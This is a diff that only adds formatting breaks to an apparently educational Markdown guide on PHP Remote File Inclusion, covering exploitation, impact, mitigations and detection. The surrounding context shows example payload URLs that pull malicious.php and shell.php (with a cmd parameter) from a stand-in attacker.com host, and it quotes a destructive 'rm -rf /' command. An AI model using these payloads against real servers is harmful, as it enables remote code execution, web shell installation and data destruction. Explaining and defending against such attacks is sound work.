@@ -23,8 +23,8 @@ http://example.com/index.php?file=http://attacker.com/malicious.php
 
 ### What Happens
   - The application fetches http://attacker.com/malicious.php.
-  - The included file executes as part of the server’s PHP script, potentially compromising the system.
-
+  - The included file executes as part of the server’s PHP script, potentially compromising the system.  
+<br>
 
 ## 2. Why RFI Is Less Common Today
 ### 1. Modern PHP Settings
@@ -42,8 +42,8 @@ allow_url_include = Off
 ### 3. Content Security Policy (CSP)
 - Modern web applications **enforce CSP headers**, restricting the inclusion of untrusted scripts and resources.
 ### 4. Prevalence of Local File Inclusion (LFI)
-- Attackers often exploit LFI, which is more common and easier to find.
-
+- Attackers often exploit LFI, which is more common and easier to find.  
+<br>
 
 ## 3. Exploitation Techniques
 
@@ -71,8 +71,8 @@ http://example.com/index.php?file=http://attacker.com/shell.php&cmd=id
 ```
 
 ### c. Information Gathering
-- Attackers may include remote files to **exfiltrate sensitive data**.
-
+- Attackers may include remote files to **exfiltrate sensitive data**.  
+<br>
 
 ## 4. Potential Impact of RFI
 ### 1. Code Execution
@@ -92,8 +92,8 @@ system('rm -rf /');
   - Gain elevated privileges by injecting scripts that exploit local configurations.
 
 ### 4. Web Shell Deployment
-  - Install persistent backdoors for ongoing access.
-
+  - Install persistent backdoors for ongoing access.  
+<br>
 
 ## 5. Mitigation Techniques
 ### 1. Disable Remote File Inclusion
@@ -135,8 +135,8 @@ Content-Security-Policy: script-src 'self';
 ```
 
 ### 6. Web Application Firewalls (WAF)
-  - **Use WAFs** to block suspicious patterns indicative of RFI attacks (e.g., URLs in file parameters).
-
+  - **Use WAFs** to block suspicious patterns indicative of RFI attacks (e.g., URLs in file parameters).  
+<br>
 
 ## 6. Tools for Detection
 ### 1. Burp Suite
@@ -153,8 +153,8 @@ Content-Security-Policy: script-src 'self';
 
 ```
 http://example.com/index.php?file=http://attacker.com/malicious.php
-```
-
+```  
+<br>
 
 ## 7. Real-World Example
 
@@ -166,8 +166,8 @@ http://example.com/index.php?file=http://attacker.com/malicious.php
 http://example.com/index.php?file=http://attacker.com/malicious.php
 ```
 
-  - The malicious file installed a web shell, allowing the attacker to execute arbitrary commands, upload additional scripts, and exfiltrate sensitive data.
-
+  - The malicious file installed a web shell, allowing the attacker to execute arbitrary commands, upload additional scripts, and exfiltrate sensitive data.  
+<br>
 
 ## 8. Summary
 
